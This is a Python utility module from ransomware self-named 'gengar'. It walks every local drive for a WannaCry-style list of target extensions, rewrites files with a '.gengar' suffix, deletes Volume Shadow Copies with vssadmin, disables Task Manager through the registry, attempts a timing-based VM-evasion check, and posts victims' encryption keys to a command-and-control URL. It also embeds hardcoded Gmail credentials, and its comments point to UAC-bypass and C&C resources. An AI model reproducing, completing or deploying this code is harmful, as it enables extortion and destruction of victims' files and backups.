import os
from re import I
import sys
import oschmod
import win32api
import ctypes
import winreg
import time
import requests
from datetime import datetime
import traceback
from fsplit.filesplit import Filesplit


class Utils:
    """
        Class with a wide variety of useful functionalities as well as other variables.
    """


    # name of the Ransomware
    BRAND_NAME = 'gengar'
    BRAND_EXT = '.gengar'


    # mail variables
    SENDER = 'teamcyber541@gmail.com'
    SENDER_PASSWORD = 'new_password100'
    RECEIVER = 'teamcyber5412@gmail.com'
    MAIL_SERVER = 'smtp.gmail.com'
    MAIL_PORT = 587
    KEY_PASSWORD = 'key_FILE_passw0rd!'


    # directories that must avoid from encrypting
    PROTECTED_DIRS = ['Content.IE5',
                      'Temporary Internet Files',
                      'AppData',
                      'Program Files (x86)',
                      'Program Files', 'ProgramData',
                      'Intel',
                      '$\\',
                      'Local Settings',
                      'Windows',
                      'ransomware',
                      'Boot',
                      'System Volume Information',
                      'Vídeos']


    # file extensions that must avoid from encrypting
    EXCLUDED_EXT = ['.gengar',
                    '.dll',
                    '.exe']


    # file extensions that we must encrypt. Same extensions as Wannacry
    TARGET_EXT = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf',
                  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
                  '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ',
                  '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai',
                  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
                  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
                  '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
                  '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
                  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der', '.py']


    MAX_SIZE_FILE = 1000000000 # Maximum size of files must be 1 GB, otherwise file split is needed
    DISABLE_TASKMANAGER_KEY_LOCATION = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"


    def get_file_extension(self, full_path):
        """
        :param full_path: path to the file
        :return: extension of the passed file
        """
        return os.path.splitext(full_path)[1]


    def save_data(self, full_path, data, opt='add_ext'):
        if not os.access(full_path, os.W_OK):
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.W_OK):
                raise PermissionError("Write permissions can't be modified")

        with open(full_path, 'wb') as file:
            file.write(data)

        if opt == 'add_ext':
            os.rename(full_path, full_path + self.BRAND_EXT)
        elif opt == 'del_ext':
            os.rename(full_path, full_path[:-len(self.BRAND_EXT)])
        else:
            raise ValueError('Invalid argument at the time of saving data')


    def load_data(self, full_path):
        if not os.access(full_path, os.R_OK):
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.R_OK):
                raise PermissionError("Read permisions can't be modified")
        
        with open(full_path, 'rb') as file:
            return file.read()

    
    def search_and_split(self, local_drives):
        try:
            fs = Filesplit()
            for ld in local_drives:
                for root, dirs, files in os.walk(ld):
                    for fn in files:
                        full_path = root + os.sep + fn
                        ext = self.get_file_extension(full_path)
                        if ext in self.TARGET_EXT and ext not in self.EXCLUDED_EXT:
                            if os.path.getsize(full_path) > self.MAX_SIZE_FILE:
                                print("splitting files...")
                                dir_name = str(fn) + "_gengar_splitted_file"
                                os.mkdir(dir_name)
                                fs.split(file=full_path, split_size=self.MAX_SIZE_FILE, output_dir=dir_name)
                                os.remove(full_path)
        except:
            traceback.print_exc()


    def search_and_merge(self, local_drives):
        try:
            fs = Filesplit()
            for ld in local_drives:
                for root, dirs, files in os.walk(ld):
                    for d in dirs:
                        full_path = root + os.sep + d
                        if d.endswith("_gengar_splitted_file"):
                            print("merging files...")
                            fs.merge(input_dir=full_path)
        except:
            traceback.print_exc()


    # Duplicado en VirtualEnvironmentDetector
    def is_windows(self):
        return os.name == 'nt'


    def get_local_drives(self):
        return win32api.GetLogicalDriveStrings().split('\000')[:-1]


    # Metodos duplicados
    def is_admin(self):
        if self.is_windows():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() == 1
            except:
                traceback.print_exc()
                return False
        else:
            raise Exception("Not running in Windows System")


    # TODO deprecated
    def run_as_admin(self, argv=None, debug=False):
        if argv is None:
            raise ValueError("argv is None")

        if hasattr(sys, '_MEIPASS'):
            # Support pyinstaller wrapped program.
            arguments = str(argv[1:])
        else:
            arguments = str(argv)

        executable = str(sys.executable)

        if debug:
            print('Command line: ', executable, arguments)

        ret = ctypes.windll.shell32.ShellExecuteW(
            None, u"runas", executable, arguments, None, 1)

        if int(ret) <= 32:
            raise Exception("Command not executed")

            
    def delete_shadowcopies(self):
        try:
            os.system("cmd /c vssadmin delete shadows /all /quiet")
        except:
            traceback.print_exc()


    def enable_task_manager(self):
        key_exists = False
        
        # Try to read the key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_TASKMANAGER_KEY_LOCATION)
            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
            winreg.CloseKey(reg)
            key_exists = True
        except:
            pass
            
        # If key exists and is disabled, enable it
        if key_exists and disabled:
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION,
                                  0,
                                  winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000000)
            winreg.CloseKey(reg)


    def disable_task_manager(self):
        key_exists = False
        
        # Try to read the key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_TASKMANAGER_KEY_LOCATION)
            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
            winreg.CloseKey(reg)
            key_exists = True
        except:
            pass
        
        # If key doesn't exist, create it and set to disabled
        if not key_exists:
            reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
            winreg.CloseKey(reg)
        # If enabled, disable it
        elif key_exists and not disabled:
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION,
                                  0,
                                  winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
            winreg.CloseKey(reg)

    """
    We must provide a JSON as the one it follows:

    {
        'operation': 'insert'/'update'
        'id': as a unique identifier,
        'key': encoded_key,
        'date': datetime,
        'state': 'infected'/'paid'
    }
    """
    def send_post_request(self, url, id, key, mode='insert', state='infected'):
        try:
            if mode=='insert': 
                date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                data = {'operation':mode, 'id': id, 'key': str(key), 'date':date, 'state': state}
            elif mode=='update':
                data = {'operation':mode, 'id': id, 'state': state}
            print(data)
            requests.post(url, json=data)
        except:
            traceback.print_exc()

    def reboot(self):
        win32api.InitiateSystemShutdown()

    """
    Return false if we are running on a virtualized environment
    TODO Tested and not recognize VM Env
    """
    def pass_vm_check(self):
        for i in range(10):
            t1 = time.perf_counter()
            ctypes.windll.kernel32.GetProcessHeap()

            t2 = time.perf_counter()
            win32api.CloseHandle(0)

            t3 = time.perf_counter()

            if (((t3-t2)/(t2-t1)) >= 10):
                return True
        return False
    

# LINKS HERE
# https://www.youtube.com/watch?v=UoMzCyB2IvE
# read this https://www.xataka.com/basics/copias-seguridad-windows-10-sirven-que-tipos-hay-como-se-hacen
# https://techpress.net/volume-shadow-copy-troubleshooting-delete-existing-shadow-copies-on-windows-server-using-command-line-vssadmin-command-examples-use-of-diskshadow-command/
# https://hardsoftsecurity.es/index.php/2019/12/19/uac-bypass-windows-10/

# HOW Locky DETECT VM ENV
# https://www.forcepoint.com/blog/x-labs/locky-returned-new-anti-vm-trick
# https://www.hackplayers.com/2019/02/deteccion-de-VMs-y-contramedidas.html
# https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods

# TODO Necesito un C&C
# https://sdos.es/blog/ngrok-una-herramienta-con-la-que-hacer-publico-tu-localhost-de-forma-facil-y-rapida
# https://ngrok.com/docs
